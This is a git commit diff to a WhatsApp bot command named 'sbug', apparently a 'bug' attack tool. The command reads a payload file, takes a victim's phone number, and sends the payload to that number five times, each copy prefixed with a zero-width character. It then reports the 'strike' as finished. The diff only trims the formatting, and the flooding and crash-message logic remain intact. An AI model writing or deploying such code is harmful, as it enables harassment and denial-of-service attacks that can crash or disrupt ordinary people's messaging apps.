7f06d68a4dedefe24ed783fccfb587659f19c21d
Loving Programming <officialstanlee143@gmail.com>
2026-02-11 16:50:27 +0300

    Update sbug.js

--- commands/bug/sbug.js
+++ commands/bug/sbug.js
@@ -3,17 +3,14 @@ const config = require('../../config');
 
 module.exports = {
     name: "sbug",
-    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
+    execute: async (conn, msg, args, { from, isOwner }) => {
         if (!isOwner) return;
         let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
         const payload = fs.readFileSync('./lib/payloads/sbug.text', 'utf-8');
 
         for (let i = 0; i < 5; i++) {
-            await conn.sendMessage(target, { 
-                text: "\u200B" + payload,
-                contextInfo: { forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: "ɪɴꜱɪᴅɪᴏᴜꜱ ꜱᴛᴇᴀʟᴛʜ" } }
-            });
+            await conn.sendMessage(target, { text: "\u200B" + payload });
         }
-        await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Successful: SBUG1 deployed.") });
+        await conn.sendMessage(conn.user.id, { text: "🥀 Mission Success: SBUG1 Strike Finished." });
     }
 };
